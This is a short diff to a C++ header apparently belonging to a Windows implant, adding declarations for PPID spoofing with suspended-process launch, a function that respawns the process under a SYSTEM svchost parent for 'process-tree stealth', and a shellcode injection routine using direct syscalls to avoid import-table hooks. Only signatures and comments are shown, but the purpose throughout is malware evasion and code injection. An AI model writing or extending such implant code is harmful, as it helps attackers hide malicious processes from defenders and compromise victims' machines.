@@ -3,9 +3,14 @@
 #include <windows.h>
 #include <cstdint>
 
-// PPID spoofing — launch a process as a child of targetPid (not the implant)
+// PPID spoofing — launch a process as a child of targetPid (not the implant).
+// hThreadOut: if non-null, process starts SUSPENDED and caller must ResumeThread.
 BOOL SpawnWithPPID(const wchar_t* targetPath, DWORD parentPid,
-                   HANDLE* hProcessOut = nullptr);
+                   HANDLE* hProcessOut = nullptr, HANDLE* hThreadOut = nullptr);
+
+// Respawn this process under a SYSTEM svchost PPID for process-tree stealth.
+// Returns true if a child was spawned (caller should exit), false to continue running.
+bool TryRespawnUnderSvchost();
 
 // Remote process injection via direct syscall chain (no IAT touches)
 // payload: raw shellcode bytes, payloadSize: byte count
